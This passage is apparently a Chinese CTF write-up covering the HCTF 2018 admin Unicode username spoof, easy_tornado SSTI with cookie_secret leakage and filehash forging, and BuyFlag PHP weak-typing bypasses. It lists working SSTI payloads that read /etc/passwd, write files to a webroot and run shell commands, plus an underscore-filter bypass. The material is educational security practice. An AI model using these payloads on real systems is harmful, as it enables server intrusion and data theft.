id="unicode欺骗">unicode欺骗</h4><blockquote><p>参考：</p><p>https://darkwing.moe/2019/11/04/HCTF-2018-admin/</p><p>更多，包含其他字符欺骗（<strong>idna</strong>）+php变量绕过：https://www.geek-share.com/detail/2798492491.html</p></blockquote><p>查看源码，发现各种操作：注册，登录，修改密码，都会先对用户名小写</p><pre><code class="hljs fortran"><span class="hljs-keyword">name</span> = strlower(<span class="hljs-keyword">form</span><span class="hljs-number">.</span>username<span class="hljs-number">.</span><span class="hljs-keyword">data</span>)</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305140113647.png" alt="image-20220305140113647" style="zoom:67%;"></p><p>函数定义：</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strlower</span>(<span class="hljs-params">username</span>):</span>    username = nodeprep.prepare(username)    <span class="hljs-keyword">return</span> username</code></pre><p>而nodeprep是个库，from twisted.words.protocols.jabber.xmpp_stringprepimportnodeprep，而源码导入的版本是10.2.0，而官网最新的版本是22.2.0，这么老的版本肯定会有漏洞</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305141538923.png" alt="image-20220305141538923" style="zoom:67%;"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305141458847.png" alt="image-20220305141458847"></p><ul><li>漏洞成因：</li></ul><p>unicode问题，对于一些特殊字符，nodeprep.prepare会进行如下操作</p><pre><code class="hljs clean">ᴬ -&gt; A -&gt; a即该函数调用第一次将其转换为大写，第二次将其转换为小写</code></pre><p><strong>所以当我们用<code>ᴬdmin</code>注册的话，后台代码调用一次nodeprep.prepare函数，添加用户Admin+密码</strong></p><p><strong>我们用<code>ᴬdmin</code>进行登录，后台代码调用一次nodeprep.prepare函数，后台以为登陆的用户是Admin，检查有无这个用户+密码正确与否，然后登录成功后<code>session['name']=Admin</code>，可以看到index页面的username变成了Admin</strong></p><p><strong>登陆状态下修改密码，后台代码<code>name = strlower(session['name'])</code>,对session['name']调用一次nodeprep.prepare函数，name变为<code>admin</code>,然后修改用户为admin的密码</strong></p><p>那么，攻击链大概就这样</p><ul><li>注册用户ᴬdmin</li><li>登录用户ᴬdmin，变成Admin</li><li>修改密码Admin，更改了admin的密码</li></ul><p>在index.html中可以看到只要<code>session['name']=='admin'</code>,也就是只要用户名是<code>admin</code>就可成功登录了</p><ul><li><p>具体字母怎么找?</p><p>关于具体编码可查https://unicode-table.com/en/sets/superscript-and-subscript-letters/，当然你也可以复制过后用站长工具转换成Unicode编码。</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305145448969.png" alt="image-20220305145448969" style="zoom:67%;"></p></li></ul><h2 id="护网杯-2018easy_tornado">[护网杯 2018]easy_tornado（**）</h2><h4 id="考点cookie_secret模板注入">考点：cookie_secret、模板注入</h4><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227192953750.png" alt="image-20220227192953750"></p><p>点进界面，打开flag.txt，得到提示flag in /fllllllllllllag</p><p>打开welcome.txt，得到提示render</p><p>打开hints.txt，得到提示md5(cookie_secret+md5(filename))</p><p>然后每次打开文件，url里都有提交参数，filename和filehash</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227193123613.png" alt="image-20220227193123613"></p><p>猜测filehash对应的上filename才能访问，但是cookie_secret是啥呢？</p><p>抓包，查看cookie，发现并无cookie</p><p>burp抓包flag.txt那个文件，发现304 NOTmodified，但是直接访问是可以访问的</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227194449791.png" alt="image-20220227194449791"></p><h4 id="not-modified">304 NOT modified</h4><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304">304Not Modified</a> ：304 未改变</p><p><a href="https://baike.baidu.com/item/304%E7%8A%B6%E6%80%81%E7%A0%81/7867141">百度百科</a></p></blockquote><p>304（未修改）:自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。</p><p>​ 1.如果网页自请求者上次请求后再也没有更改过，您应将服务器配置为返回此响应（称为If-Modified-Since HTTP 标头）。服务器可以告诉 Googlebot自从上次抓取后网页没有变更，进而节省带宽和开销。</p><p>​ 2. HTTP 304未改变说明无需再次传输请求的内容，也就是说可以使用缓存的内容。这通常是在一些安全的方法（safe），例如<strong>GET或HEAD 或在请求中附带了头部信息：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since中任一首部。</strong></p><p>​ 3. 如果是 200 OK ，响应会带有头部 Cache-Control, Content-Location,Date, ETag, Expires，和 Vary.</p><h4 id="啥是-cache-control"><a href="https://zhuanlan.zhihu.com/p/79042406">啥是 Cache-Control？</a></h4><p>​ Cache-Control 是一个 HTTP协议中关于缓存的响应头，它由一些能够允许你定义一个响应资源应该何时、如何被缓存以及缓存多长时间的指令组成。</p><h5 id="cache-control-max-age">Cache-Control max-age</h5><p>这个指令告诉浏览器端或者中间者，响应资源能够在它被请求之后的多长时间以内被复用。例如，<code>max-age</code>等于3600 意味着响应资源能够在接下来的 60分钟以内被复用，<strong>而不需要从服务端重新获取</strong>。（可以发现，<code>max-age</code>的单位是秒）</p><h4 id="什么是etag"><a href="https://juejin.cn/post/6844903870636769293">什么是ETag？</a></h4><p>Etag是 Entitytag的缩写，可以理解为“被请求变量的实体值”，Etag是服务端的一个资源的标识，在HTTP响应头中将其传送到客户端。所谓的服务端资源可以是一个Web页面，也可以是JSON或XML等。服务器单独负责判断记号是什么及其含义，并在HTTP响应头中将其传送到客户端。<strong>另一种说法是，ETag是一个可以与Web资源关联的记号（token）</strong></p><p>比如，<strong>浏览器第一次请求一个资源的时候，服务端给予返回，并且返回了ETag</strong>:"50b1c1d4f775c61:df3"这样的字样给浏览器，当浏览器再次请求这个资源的时候，浏览器会将If-None-Match:W/"50b1c1d4f775c61:df3"【<strong>相同ETag值</strong>】传输给服务端，服务端拿到该ETAG，对比资源是否发生变化，如果资源未发生改变，则返回304HTTP状态码，不返回具体的资源。</p><p>解题：</p><pre><code class="hljs isbl"><span class="hljs-number">1</span>.flag在/<span class="hljs-variable">fllllllllllllag</span><span class="hljs-number">2</span>.filehash：<span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-variable">cookie_secret</span>+<span class="hljs-title">md5</span>(<span class="hljs-variable">filename</span>))</span></code></pre><p>所以我们的差的就是cookie_secret了，下面开始拿cookie_secret</p><p>通过源码和请求头并没有看到任何的cookie_secret信息，当我们尝试访问/fllllllllllllag，报错</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227211937496.png" alt="image-20220227211937496"></p><p>思路断了，看WP才知道与304cache无关。。<strong>题目是easy_tornado，/welcome.txt页面也看到==render==，可能会是SSTI模板注入</strong></p><h4 id="模板注入">模板注入**</h4><blockquote><p>参考：<a href="https://xz.aliyun.com/t/3679"><strong>详细，易懂，适合小白+CTF各种过滤绕过姿势</strong></a></p><p><a href="https://github.com/csvoss/onelinerizer">推荐一个能把Python代码给编译成一句话的形式工具</a></p></blockquote><p>总结起来就是类似SQL注入，通过控制输入参数得到数据</p><h5 id="渲染">渲染</h5><ul><li>前端开发过程：</li></ul><p>浏览器这边做的工作大致分为以下几步：</p><p>加载：根据请求的URL进行域名解析，向服务器发起请求，接收文件（HTML、JS、CSS、图象等）。</p><p>解析：对加载到的资源（HTML、JS、CSS等）进行语法解析，建议相应的内部数据结构（比如HTML的DOM树，JS的（对象）属性表，CSS的样式规则等等）</p><p><strong>渲染</strong>：构建渲染树，对各个元素进行位置计算、样式计算等等，然后根据渲染树对页面进行渲染（可以理解为“画”元素）【<strong>绘制</strong>】【<strong>将HTML变成人眼看到的图像</strong>】</p><p>这几个过程不是完全孤立的，会有交叉，比如HTML加载后就会进行解析，然后拉取HTML中指定的CSS、JS等。</p><blockquote><p>举例子：</p><p>你要吃个菜，你找到厨师说，我要尖椒肉丝。</p><p>厨师就去翻菜谱，炒给你吃。</p><p>你是浏览者</p><p>菜是你将看到的页面</p><p>厨师是浏览器</p><p>菜谱是程序员写的页面代码</p><p>炒菜的过程，就是页面渲染</p></blockquote><h5 id="dom"><a href="https://www.zhihu.com/question/34219998">DOM</a></h5><p>DOM是Document Object Model的英文缩写，翻译过来是文档对象模型</p><p>当浏览器读到这些代码时，它会建立一个<a href="https://javascript.info/dom-nodes">“DOM节点”树</a>来保持追踪所有内容，如同你会画一张家谱树来追踪家庭成员的发展一样，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。【就是把HTML代码转化为树】</p><p><strong>文档对象模型就是基于这样的文档视图结构的一种模型，所有的html页面都逃不开这个模型，也可以把它称为==节点树==更为准确。</strong></p><h5 id="什么是模板">什么是模板</h5><ul><li><p>这里特指用于 web开发的模板引擎，是为了用户界面与业务数据（内容）分离而产生的。可以生成特定格式的文档，利用模板引擎来生成前端的html代码，反馈给浏览器，呈现在用户面前。大概就是一个网页的框架，</p></li><li><p>模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p></li><li><p>而造成服务器端模板注入漏洞的成因就是服务端接收了用户的恶意输入后，未经任何处理就将其作为web应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，从而导致了敏感信息的泄露、代码执行、getshell等问题。</p></li></ul><h5 id="什么是框架">什么是框架</h5><blockquote><p>https://www.kancloud.cn/kancloud/python-basic/41708</p></blockquote><ol type="1"><li><p>不管是python，还是php，亦或别的做web项目的语言，乃至于做其它非web项目的<strong>开发</strong>，一般都要用到一个称之为什么什么框架的东西。</p></li><li><p>简而言之，框架就是制定一套规范或者规则（思想），大家（程序员）在该规范或者规则（思想）下工作。或者说就是<strong>使用别人搭好的舞台，你来做表演</strong>。</p></li><li><p><span style="background:#BBFFBB;">python常见web框架</span>：</p></li></ol><ul><li>Django:这是一个被广泛应用的框架，如果看官在网上搜索，会发现很多公司在招聘的时候就说要会这个，其实这种招聘就暴露了该公司的开发水平要求不高。框架只是辅助，真正的程序员，用什么框架，都应该是根据需要而来。当然不同框架有不同的特点，需要学习一段时间。</li><li>==Flask==：一个用Python编写的轻量级Web应用框架。基于WerkzeugWSGI工具箱和Jinja2模板引擎。</li><li>Web2py：是一个为Python语言提供的全功能Web应用框架，旨在敏捷快速的开发Web应用，具有快速、安全以及可移植的数据库驱动的应用，兼容GoogleApp Engine（这是google的元计算引擎，后面我会单独介绍）。</li><li>Bottle: 微型PythonWeb框架，遵循WSGI，说微型，是因为它只有一个文件，除Python标准库外，它不依赖于任何第三方模块。</li><li>Tornado：全称是Torado WebServer，从名字上看就可知道它可以用作Web服务器，但同时它也是一个PythonWeb的开发框架。最初是在FriendFeed公司的网站上使用，FaceBook收购了之后便开源了出来。</li><li>webpy: 轻量级的Python Web框架。webpy的设计理念力求精简（Keep itsimple andpowerful），源码很简短，只提供一个框架所必须的东西，不依赖大量的第三方模块，它没有URL路由、没有模板也没有数据库的访问。</li></ul><h5 id="一些tornado语法">一些tornado语法：</h5><blockquote><p><a href="https://www.kancloud.cn/kancloud/python-basic/41713">参考手册**</a></p></blockquote><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页render配合Tornado使用</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment">#coding:utf-8</span><span class="hljs-keyword">import</span> tornado.httpserver<span class="hljs-keyword">import</span> tornado.ioloop<span class="hljs-keyword">import</span> tornado.options<span class="hljs-keyword">import</span> tornado.web<span class="hljs-keyword">from</span> tornado.options <span class="hljs-keyword">import</span> define, optionsdefine(<span class="hljs-string">&quot;port&quot;</span>, default=<span class="hljs-number">8000</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;run on the given port&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)  //指定网页访问的端口<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span>  //制定类及方法    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span>        greeting = self.get_argument(<span class="hljs-string">&#x27;greeting&#x27;</span>, <span class="hljs-string">&#x27;Hello&#x27;</span>)   //获得GET参数值，前者是参数名，后面是默认值，必须        self.write(greeting + <span class="hljs-string">&#x27;, welcome you to read: www.itdiffer.com&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    tornado.options.parse_command_line()   //启动命令行    app = tornado.web.Application(handlers=[(<span class="hljs-string">r&quot;/&quot;</span>, IndexHandler)]) //实例化，handlers类似路由，列表里每个元素有两个参数，路径和处理它的类    http_server = tornado.httpserver.HTTPServer(app)  //调用对象执行http服务器    http_server.listen(options.port)  //提供发送响应的接口    tornado.ioloop.IOLoop.instance().start()  //表示可以接收来自HTTP的请求了</code></pre><p><strong>用python运行这个文件，其实就已经发布了一个网站</strong></p><ul><li>而模板文件里，将<code>&#123;&#123;placeholder&#125;&#125;</code>理解为占位符，就是变量，看HTML模板代码中，有类似<code>&#123;&#123;username&#125;&#125;</code>的变量，模板中用`{{}}`引入变量，这个变量就是在self.render()中规定的，两者变量名称一致，对应将相应的值对象引入到模板中- 用``的方式，将一个字符串赋给了变量var，然后就可以直接引用这个变量了：python-tornado。这样就是实现了模板中变量的使用</li></ul><h5 id="ssti">SSTI</h5><blockquote><p><a href="https://www.freebuf.com/author/和蔼的杨小二">freebuf从零学习flask模板注入**</a></p><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">csdnSSTI完全学习+工具Tplmap实例</a></p><p><a href="https://blog.csdn.net/Goodric/article/details/115170932?utm_source=app&amp;app_version=4.20.0">csdn初识SSTI 服务器端模板注入，有py2+py3的payload</a></p><p><a href="https://github.com/epinna/tplmap">🛠模板注入，工具Tplmap**</a></p><p><a href="https://xz.aliyun.com/t/2908">源码+ctf例题：Python中从服务端模板注入到沙盒逃逸的源码探索(一)</a></p></blockquote><p>SSTI就是服务器端模板注入(Server-Side Template Injection)</p><ul><li>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如<span style="background:#FF9999;">Python的jinja2(Flask) mako tornadodjango，php的smarty twig，java的jadevelocity</span>。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</li></ul><h6 id="xss利用">XSS利用</h6><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/test/&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)    html = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">        &lt;h3&gt;%s&lt;/h3&gt;</span><span class="hljs-string">    &#x27;&#x27;&#x27;</span>%(code)   //python里的三引号指多行代码，%s指字符串，由变量code填充    <span class="hljs-keyword">return</span> render_template_string(html)</code></pre><p>这段代码存在漏洞的原因是数据和代码的混淆。<strong>代码中的<code>code</code>是用户可控的，会和html拼接后直接带入渲染</strong>。</p><p>尝试构造code为一串js代码，会执行js，弹窗。</p><p>而以下代码：</p><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/test/&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&lt;h1&gt;&#123;&#123; code &#125;&#125;&lt;/h1&gt;&#x27;</span>,code=code)</code></pre><p>js代码被原样输出了。<strong>这是因为模板引擎一般都默认对渲染的变量值(猜测是`{{}}`)进行编码转义，这样就不会存在xss了**。在这段代码中用户**所控的是code变量，而不是模板内容**。**存在漏洞的代码中，模板内容直接受用户控制的**。不仅可以xss，还可以进行其他攻击###### SSTI文件读取/命令执行<pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/test/&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)    html = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">        &lt;h3&gt;%s&lt;/h3&gt;</span><span class="hljs-string">    &#x27;&#x27;&#x27;</span>%(code)    <span class="hljs-keyword">return</span> render_template_string(html)</code></pre>构造参数8，返回执行结果8，</strong>可以看到表达式被执行了。**</p><p>那么可以<strong>通过python的对象的继承、利用可用子类的方法来一步步实现文件读取和命令执行，具体看参考链接</strong></p><p>利用：【<span style="background:#FF9999;">因为位置可能不同，所以用if查找</span>】</p><ul><li>==读文件：==</li></ul><pre><code class="hljs markdown">&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;   //py2还有:().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">r&#x27;C:\1.php&#x27;</span>).read()object.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">r&#x27;C:\1.php&#x27;</span>).read()更保险： &#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch<span class="hljs-emphasis">_warnings&#x27; %&#125;&#123;&#123;</span><span class="hljs-emphasis"> c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;在这里输入文件名&#x27;, &#x27;r&#x27;).read()</span><span class="hljs-emphasis"> &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; //py3</span></code></pre><ul><li>==写文件==</li></ul><pre><code class="hljs markdown">//写文件().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;</span>).write(&#x27;123&#x27;)object.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;</span>).write(&#x27;123&#x27;)</code></pre><ul><li>==命令执行==</li></ul><pre><code class="hljs markdown">&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[2].<span class="hljs-strong">__subclasses__</span>()[71].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;os&#x27;].system(&#x27;ls&#x27;)&#125;&#125;还有：().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.func<span class="hljs-emphasis">_globals.values()[<span class="hljs-string">13</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&#x27;<span class="hljs-strong">__import__</span>(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><span class="hljs-emphasis"></span><span class="hljs-emphasis">&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if</span><span class="hljs-emphasis">c.<span class="hljs-strong">__name__</span>==&#x27;catch_</span>warnings&#x27; %&#125;&#123;&#123;c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;  //py3</code></pre><p>构造paylaod的思路和构造文件读取的是一样的。只不过命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps或者利用ceye)</p><p><span style="background:#FF9999;">测试是否有注入点 2之类的，成功执行则说明有模版注入</span></p><h6 id="下划线被过滤">下划线被过滤？</h6><p>可以用request.args获取get参数绕过</p><p>例如</p><pre><code class="hljs markdown">http://e0579dc296f4fa31220536d95e3b68b5.challenge.mini.lctf.online:1080/?class=<span class="hljs-strong">__class__</span>&amp;mro=<span class="hljs-strong">__mro__</span>&amp;subclasses=<span class="hljs-strong">__subclasses__</span>&amp;init=<span class="hljs-strong">__init__</span>&amp;globals=<span class="hljs-strong">__globals__</span>&amp;popen=popen&amp;cmd=cat /flag&#123;&#123;()[<span class="hljs-string">request.args.class</span>][<span class="hljs-symbol">request.args.mro</span>][<span class="hljs-string">-1</span>][<span class="hljs-symbol">request.args.subclasses</span>]()[<span class="hljs-string">127</span>][<span class="hljs-symbol">request.args.init</span>][<span class="hljs-string">request.args.globals</span>][<span class="hljs-symbol">request.args.popen</span>](request.args.cmd).read() &#125;&#125;</code></pre><h4 id="解题">解题</h4><p>flag in /fllllllllllllag</p><p>md5(cookie_secret+md5(filename))</p><p>针对报错界面的/error?msg=Error尝试模板注入</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227211937496.png" alt="image-20220227211937496"></p><p>输入/error?msg=2，返回2</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228210519796.png" alt="image-20220228210519796"></p><p>/error?msg=8，返回ORZ</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228210447911.png" alt="image-20220228210447911"></p><p><code>/error?msg=&#123;&#123;4/2&#125;&#125;</code>，除和减也是返回ORZ，<code>/error?msg=&#123;&#123;*&#125;&#125;</code>、<code>/error?msg=&#123;&#123;_&#125;&#125;</code>也是返回ORZ，应该是过滤了特殊字符</p><h6 id="怎么找cookie_secret呢">怎么找cookie_secret呢？</h6><blockquote><p><a href="https://www.jianshu.com/p/c4070d6f4249">具体分析，源码</a></p></blockquote><p>查看wp发现<strong>用的就是handler.settings对象</strong></p><ol type="1"><li>什么是cookie_secret? <a href="https://tornado-zh.readthedocs.io/zh/latest/guide/security.html">tornado文档</a>里的部分源码：</li></ol><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainHandler</span>(<span class="hljs-params">BaseHandler</span>):</span><span class="hljs-meta">    @tornado.web.authenticated</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span>        name = tornado.escape.xhtml_escape(self.current_user)        self.write(<span class="hljs-string">&quot;Hello, &quot;</span> + name)settings = &#123;    <span class="hljs-string">&quot;cookie_secret&quot;</span>: <span class="hljs-string">&quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;</span>,    <span class="hljs-string">&quot;login_url&quot;</span>: <span class="hljs-string">&quot;/login&quot;</span>,&#125;application = tornado.web.Application([    (<span class="hljs-string">r&quot;/&quot;</span>, MainHandler),    (<span class="hljs-string">r&quot;/login&quot;</span>, LoginHandler),], **settings)</code></pre><p>settings中的属性"cookie_secret"（应该是一个经过HMAC加密的够长且随机的字节序列）</p><p>settings又作为参数传入了Application类构造函数</p><p><strong>因此可以通过<code>self.application.settings</code>获取到cookie_secret</strong></p><ol start="2" type="1"><li><p>RequestHandler类中的一个方法<strong>将RequestHandler类本身赋值给了handler</strong>，因此handler.settings实际上就是RequestHandler.settings（self.setting）【即<code>handler</code>就等于<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.tornadoweb.org%2Fen%2Flatest%2Fweb.html%23tornado.web.RequestHandler"><code>RequestHandler</code></a>】</p></li><li><p><code>RequestHandler.settings</code>别名<code>self.application.settings</code></p></li><li><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以<code>handler.settings</code>就指向RequestHandler.application.settings了，这里面就是我们的一些<strong><em>环境变量</em></strong></p></li></ol><p>==简单而言通过<code>&#123;&#123;handler.application.settings&#125;&#125;</code>或者<code>&#123;&#123;handler.settings&#125;&#125;</code>就可获得<code>settings</code>中的<strong>cookie_secret</strong>。==</p><p><code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code>得到cookie_secret:9d1f67f0-bb20-4878-a71e-16da5ce18c57</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211001182.png" alt="image-20220228211001182"></p><p>❗注意，这个与抓包里的cookie无关</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211146954.png" alt="image-20220228211146954"></p><p>计算filehash:md5(cookie_secret+md5(filename))</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a=<span class="hljs-string">&#x27;9d1f67f0-bb20-4878-a71e-16da5ce18c57&#x27;</span>;$b=<span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span>;<span class="hljs-comment">//echo $a.$b;</span><span class="hljs-keyword">echo</span> md5($a.md5($b));</code></pre><p>payload：</p><pre><code class="hljs sas">/<span class="hljs-meta">file</span>?<span class="hljs-meta">filename</span>=/fllllllllllllag<span class="hljs-variable">&amp;filehash</span>=f0c23d729e726f692178be3dda2f2b4b</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211604055.png" alt="image-20220228211604055"></p><h2 id="极客大挑战-2019buyflag易">[极客大挑战 2019]BuyFlag（易）</h2><h4 id="考点弱类型比较绕过数据长度限制strcmp">考点：弱类型比较、绕过数据长度限制、strcmp</h4><p>点进菜单的payflag，提示:</p><pre><code class="hljs erlang-repl">If you want to buy the FLAG:You must be a student from CUIT!!!You must be answer the correct password!!!</code></pre><p>在源码里发现提示</p><pre><code class="hljs php">~~~post money <span class="hljs-keyword">and</span> password~~~<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;$password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-keyword">if</span> (is_numeric($password)) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;&#125;<span class="hljs-keyword">elseif</span> ($password == <span class="hljs-number">404</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;&#125;&#125;</code></pre><p>关于You must be a student fromCUIT!!!，尝试修改referer不对，发现cookie：user=0，修改为CUIT也不对，修改为1，正确</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305161122799.png" alt="image-20220305161122799"></p><p>绕过password：</p><pre><code class="hljs erlang-repl">password=<span class="hljs-number">404</span>    ==》password can&#x27;t be numberpassword=<span class="hljs-string">&#x27;404&#x27;</span>  ==》Wrong Password!!   ==》给的是部分php源码password=<span class="hljs-number">404</span>a   ==》Password Right!Pay for the flag!!!hacker!!!</code></pre><p>根据Flag need your 100000000 money，猜测还有个参数money</p><pre><code class="hljs lsl">password=<span class="hljs-number">404</span>a&amp;<span class="hljs-section">money</span>=<span class="hljs-number">100000000</span>  ==》Password Right!&lt;/br&gt;Nember lenth is too long&lt;/br&gt;password=<span class="hljs-number">404</span>a&amp;<span class="hljs-section">money</span>=<span class="hljs-number">100</span>  ==&gt;&gt;Password Right!&lt;/br&gt;you have not enough <span class="hljs-section">money</span>,loser~&lt;/br&gt;用科学计数法,<span class="hljs-number">1e10</span>即<span class="hljs-number">1</span>*<span class="hljs-number">10</span>的<span class="hljs-number">10</span>次方，大于等于<span class="hljs-number">9</span>就能买了password=<span class="hljs-number">404</span>a&amp;<span class="hljs-section">money</span>=<span class="hljs-number">1e10</span>  ==&gt;&gt;Password Right!&lt;/br&gt;flag&#123;fb7ec519<span class="hljs-number">-90e9</span><span class="hljs-number">-47</span>d4<span class="hljs-number">-92</span>cf-ba9b204eeb54&#125;</code></pre><blockquote><p><strong>在</strong><a href="https://baike.baidu.com/item/科学计数法">科学计数法</a><strong>中，为了使公式简便，可以用带“E”的格式表示。当用该格式表示时，E前面的数字和“E+”后面要精确到十分位，（位数不够末尾补0）,例如7.8乘10的7次方，正常写法为：7.8x10^7,简写为“7.8E+07”的形式</strong></p></blockquote><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305161955432.png" alt="image-20220305161955432"></p><p>更多方法：</p><p>绕numeric的：</p><blockquote><p><strong><em>is_numberic():就是判断括号里面的变量是不是数值</em></strong>漏洞绕过：is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。</p></blockquote><pre><code class="hljs angelscript">在后面加上%<span class="hljs-number">20</span>跳过：<span class="hljs-number">404</span>%<span 